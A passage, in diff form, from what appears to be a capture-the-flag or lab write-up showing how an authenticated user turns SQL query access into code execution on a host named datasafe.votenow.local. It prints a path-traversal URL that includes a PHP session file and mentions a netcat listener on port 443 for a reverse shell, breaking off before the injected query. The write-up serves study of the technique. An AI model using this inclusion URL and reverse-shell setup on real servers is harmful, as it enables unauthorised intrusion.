@@ -71,7 +71,9 @@ After authentication it is possible to execute sql queries on the databases pres
 Under normal circumstances, the web application does not interpret or execute code placed within backticks. However, by meticulously crafting the URL and embedding a PHP script within backticks in a SQL query, it becomes possible to execute the script.
 
 The URL must have the following format:
+
 'http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/ php/session/sess_{cookieValue}'
+
 where {cookieValue} is the current session's cookie value.
 
 By listening with a netcat listener on port 443 and injecting a SQL query like:
